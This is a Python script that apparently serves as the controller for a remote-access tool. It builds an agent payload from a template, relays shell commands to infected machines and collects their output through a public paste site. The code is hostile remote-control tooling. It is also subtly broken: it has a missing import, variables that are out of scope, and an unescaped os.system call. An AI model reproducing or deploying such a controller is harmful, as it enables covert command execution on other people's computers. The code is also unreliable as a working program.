#!/usr/bin/python3

import requests, uuid

def send(text):
	os.system("echo \"%s\" | curl -F c=@- %s" % (text,url))
def recv():
	return requests.get(url).content

def build_payload():
	return url + open("./template.py","r").read()

def server_loop():
	old = recv()
	while True:
		new = recv()
		if not new == old:
			old = new
			handle(new)

def handle(msg):
	if ":" in msg and msg.split(":")[0] == "connect":
		agent = msg.split(":")[1]
		print("[%s] is online!" % agent)
		send("ok")
	elif msg == "getcmd":
		cmd = input(agent+"> ")
		send("cmd:"+cmd)
	elif "#" in msg and msg.split("#")[0] == "result":
		res = msg.split("#")
		res.remove(res[0])
		res = "#".join(res)
		print(res)
		send("ok")
	else:
		print("Unrecognized message:\n" + msg + "\n\n")

def main():
	id = input("Enter secret name or leave blank to auto-generate: ")
	if id == "": id = ''.join(str(uuid.uuid4()).split("-"))
	url = "https://ptpb.pw/~" + id
	build = input("Build payload? Y/n: ").lower()
	if not build == "n":
		filename = input("Enter filename to save as: ")
		with open(filename,"w") as f:
			f.write(build_payload())
		print("Saved payload to: " + filename)
	send("empty")
	server_loop()

if __name__ == "__main__":
	main()